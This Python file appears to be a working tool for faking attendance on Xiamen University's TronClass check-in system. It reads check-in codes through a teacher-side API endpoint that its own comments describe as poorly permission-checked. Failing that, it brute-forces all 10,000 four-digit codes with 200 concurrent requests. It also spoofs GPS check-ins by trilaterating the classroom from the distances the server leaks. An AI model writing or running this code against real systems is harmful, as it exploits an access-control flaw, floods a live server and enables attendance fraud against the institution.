import uuid
import asyncio
import aiohttp
import math
from aiohttp import CookieJar

base_url = "https://lnt.xmu.edu.cn"
headers = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Referer": "https://ids.xmu.edu.cn/authserver/login",
}

def pad(i):
    return str(i).zfill(4)

# 直接取码用的请求头（参考 zako_rollcall: github.com/YixuAnsensei/xmu_rollcall_zako_Tronclass）
fetch_headers = {
    "User-Agent": headers["User-Agent"],
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Referer": f"{base_url}/",
}

def _parse_number_code(data):
    """从接口返回中递归提取 4 位数字签到码"""
    if isinstance(data, dict):
        raw = data.get("number_code")
        if raw is not None:
            code = str(raw).strip()
            if code.isdigit() and len(code) <= 4:
                return code.zfill(4)
        for key in ("data", "rollcalls", "student_rollcalls"):
            found = _parse_number_code(data.get(key))
            if found:
                return found
    elif isinstance(data, list):
        for item in data:
            found = _parse_number_code(item)
            if found:
                return found
    return None

def get_number_code(in_session, rollcall_id):
    """直接获取签到码。

    教师端签到详情接口 /api/rollcall/{id}/student_rollcalls 对学生的
    权限审查不严，用合法 session 即可读到 number_code 字段。
    失败返回 None（由调用方回退暴力枚举）。
    """
    url = f"{base_url}/api/rollcall/{rollcall_id}/student_rollcalls"
    try:
        resp = in_session.get(url, headers=fetch_headers, timeout=10)
        if resp.status_code != 200:
            return None
        return _parse_number_code(resp.json())
    except Exception:
        return None

def _find_student_rollcalls(data):
    """从嵌套 JSON 中找到 student_rollcalls 列表（返回结构可能随版本变化）"""
    if isinstance(data, dict):
        if isinstance(data.get("student_rollcalls"), list):
            return data["student_rollcalls"]
        for v in data.values():
            found = _find_student_rollcalls(v)
            if found:
                return found
    elif isinstance(data, list):
        for item in data:
            found = _find_student_rollcalls(item)
            if found:
                return found
    return []

def get_signed_count(in_session, rollcall_id):
    """统计某次签到已签到的学生数。

    遍历 student_rollcalls 中 rollcall_status == 'on_call_fine' 的记录。
    返回 (count, None)；接口失败时返回 (None, None)。
    """
    url = f"{base_url}/api/rollcall/{rollcall_id}/student_rollcalls"
    try:
        resp = in_session.get(url, headers=fetch_headers, timeout=10)
        if resp.status_code != 200:
            return None, None
        data = resp.json()
    except Exception:
        return None, None
    students = _find_student_rollcalls(data)
    count = sum(
        1 for s in students
        if isinstance(s, dict) and str(s.get("rollcall_status", "")).lower() == "on_call_fine"
    )
    return count, None

def _send_single_code(in_session, rollcall_id, code, attempts=3):
    """用已知签到码直接提交，返回是否成功"""
    url = f"{base_url}/api/rollcall/{rollcall_id}/answer_number_rollcall"
    for _ in range(attempts):
        try:
            resp = in_session.put(
                url,
                json={"deviceId": str(uuid.uuid4()), "numberCode": code},
                timeout=5,
            )
            if resp.status_code == 200:
                return True
        except Exception:
            pass
    return False

def _aiohttp_session_from(in_session):
    """从同步 requests.Session 构造 aiohttp ClientSession（复制 cookies 与 headers）。

    trust_env=False：不走系统/环境代理（库调用场景下 cli 的环境变量清理不生效）。
    """
    cookie_jar = CookieJar()
    for c in in_session.cookies:
        cookie_jar.update_cookies({c.name: c.value})
    return aiohttp.ClientSession(
        headers=in_session.headers, cookie_jar=cookie_jar, trust_env=False
    )


async def _put_request(i, session, stop_flag, answer_url, sem, timeout):
    if stop_flag.is_set():
        return None
    async with sem:
        if stop_flag.is_set():
            return None
        payload = {
            "deviceId": str(uuid.uuid4()),
            "numberCode": pad(i)
        }
        try:
            async with session.put(answer_url, json=payload) as r:
                if r.status == 200:
                    stop_flag.set()
                    return pad(i)
        except Exception:
            pass
        return None


async def answer_number_code_async(in_session, rollcall_id, known_code=None,
                                   client_factory=_aiohttp_session_from):
    """数字码签到（async，供常驻事件循环内调用）。

    提供 known_code 时先单 PUT 提交，失败自动落回 0-9999 暴力枚举。
    返回成功的码字符串；失败返回 False。

    client_factory 是测试缝：注入假 ClientSession 可离线验证请求 payload。
    """
    answer_url = f"{base_url}/api/rollcall/{rollcall_id}/answer_number_rollcall"
    timeout = aiohttp.ClientTimeout(total=5)

    async with client_factory(in_session) as client:
        if known_code:
            print(f"Trying known code {known_code}...")
            try:
                async with client.put(
                    answer_url,
                    json={"deviceId": str(uuid.uuid4()), "numberCode": known_code},
                ) as r:
                    if r.status == 200:
                        print("Number code rollcall answered successfully.")
                        print("Number code: ", known_code)
                        return known_code
            except Exception:
                pass
            print("Known code submission failed, falling back to brute force...")

        print("Trying number code...")
        stop_flag = asyncio.Event()
        sem = asyncio.Semaphore(200)
        tasks = [
            asyncio.create_task(_put_request(i, client, stop_flag, answer_url, sem, timeout))
            for i in range(10000)
        ]
        try:
            for coro in asyncio.as_completed(tasks):
                res = await coro
                if res is not None:
                    for t in tasks:
                        if not t.done():
                            t.cancel()
                    print("Number code rollcall answered successfully.\nNumber code: ", res)
                    return res
        finally:
            for t in tasks:
                if not t.done():
                    t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
    print("Failed.")
    return False


def send_code(in_session, rollcall_id, known_code=None):
    """数字码签到（同步，库兼容入口）。

    若提供 known_code（如通过 get_number_code 直接获取），先单码提交
    （3 次重试），失败则回退到 0-9999 暴力枚举。

    ⚠️ 内部使用 asyncio.run，**不得在已有运行中事件循环的线程调用**
    （会抛 RuntimeError）。异步场景请改用 answer_number_code_async。
    """
    if known_code:
        print(f"Trying known code {known_code}...")
        if _send_single_code(in_session, rollcall_id, known_code):
            print("Number code rollcall answered successfully.")
            print("Number code: ", known_code)
            return known_code
        print("Known code submission failed, falling back to brute force...")
    return asyncio.run(answer_number_code_async(in_session, rollcall_id))


def send_radar(in_session, rollcall_id):
    url = f"{base_url}/api/rollcall/{rollcall_id}/answer"

    lat_1, lat_2 = 24.3, 24.6
    lon_1, lon_2 = 118.0, 118.2

    def payload(lat, lon):
        return {
            "accuracy": 35,
            "altitude": 0,
            "altitudeAccuracy": None,
            "deviceId": str(uuid.uuid4()),
            "heading": None,
            "latitude": lat,
            "longitude": lon,
            "speed": None
        }

    def submit(lat, lon):
        """提交坐标，返回 (status_code, data)；网络异常返回 (0, {})"""
        try:
            res = in_session.put(url, json=payload(lat, lon), headers=headers, timeout=10)
            try:
                data = res.json()
            except Exception:
                data = {}
            return res.status_code, data
        except Exception:
            return 0, {}

    status_1, data_1 = submit(lat_1, lon_1)
    if status_1 == 200:
        return True

    status_2, data_2 = submit(lat_2, lon_2)
    if status_2 == 200:
        return True

    distance_1 = data_1.get("distance")
    distance_2 = data_2.get("distance")
    if distance_1 is None or distance_2 is None:
        return False

    def latlon_to_xy(lat, lon, lat0, lon0):
        R = 6371000
        x = math.radians(lon - lon0) * R * math.cos(math.radians(lat0))
        y = math.radians(lat - lat0) * R
        return x, y

    def xy_to_latlon(x, y, lat0, lon0):
        R = 6371000
        lat = lat0 + math.degrees(y / R)
        lon = lon0 + math.degrees(x / (R * math.cos(math.radians(lat0))))
        return lat, lon

    def circle_intersections(x1, y1, d1, x2, y2, d2):
        D = math.hypot(x2 - x1, y2 - y1)

        if D > d1 + d2 or D < abs(d1 - d2):
            return None

        a = (d1**2 - d2**2 + D**2) / (2 * D)
        h = math.sqrt(d1**2 - a**2)

        xm = x1 + a * (x2 - x1) / D
        ym = y1 + a * (y2 - y1) / D

        rx = -(y2 - y1) * (h / D)
        ry = (x2 - x1) * (h / D)

        p1 = (xm + rx, ym + ry)
        p2 = (xm - rx, ym - ry)
        return p1, p2

    def solve_two_points(lat1, lon1, lat2, lon2, d1, d2):
        lat0 = (lat1 + lat2) / 2
        lon0 = (lon1 + lon2) / 2
        x1, y1 = latlon_to_xy(lat1, lon1, lat0, lon0)
        x2, y2 = latlon_to_xy(lat2, lon2, lat0, lon0)

        sols = circle_intersections(x1, y1, d1, x2, y2, d2)
        if sols is None:
            return None

        p1 = xy_to_latlon(sols[0][0], sols[0][1], lat0, lon0)
        p2 = xy_to_latlon(sols[1][0], sols[1][1], lat0, lon0)
        return p1, p2

    resolutions = solve_two_points(lat_1, lon_1, lat_2, lon_2, distance_1, distance_2)
    if resolutions:
        ((sol_x_1, sol_y_1), (sol_x_2, sol_y_2)) = resolutions
    else:
        return False

    status_3, data_3 = submit(sol_x_1, sol_y_1)
    if status_3 == 200:
        return True
    print(data_3)

    status_4, _ = submit(sol_x_2, sol_y_2)
    if status_4 == 200:
        return True

    return False
